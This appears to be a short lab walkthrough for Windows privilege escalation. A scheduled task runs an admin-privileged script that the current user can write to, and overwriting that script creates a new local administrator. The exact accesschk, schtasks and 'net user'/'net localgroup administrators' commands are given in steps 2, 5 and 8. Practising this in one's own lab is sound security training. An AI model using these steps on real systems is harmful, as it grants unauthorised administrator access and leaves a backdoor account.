1. Download accesschk - https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
2. Use accesschk to find where is the current user permitted to write to - accesschk.exe -uqws ["username"] C:\*
3. Create a simple bat script thet prints a simple string to a file to indicate successful execution - @echo "This is some text" > C:\Users\user\Desktop\file.txt
4. Create a local admin user:
	net user admin [Password] /add
	net localgroup administrators admin /add
5. Use schtasks to create a scheduled task that will run every minute and execute the script created above with the new admin user cradentials and one with the current user cradentials from cli as admin - SCHTASKS /CREATE /SC MINUTE /MO 1 /TN ["TASK NAME"] /TR ["C:\PATH-TO-SCRIPT"] /RU admin /RP [Password] /RL HIGHEST
6. Wait for the task to run and view the result
7. Use schtasks to list all scheduled tasks and find the task you have just created with regular user privileges:
	schtasks /query
	run as user - schtasks /query /fo LIST /v
	by name - schtasks /query /tn ["task name"] /fo LIST /v
8. Modify the file to add a new user and add him to the local administrators group:
	net user [user] [password] /add
	net localgroup administrators [user] /add
9. Log in with the new user and check the premissions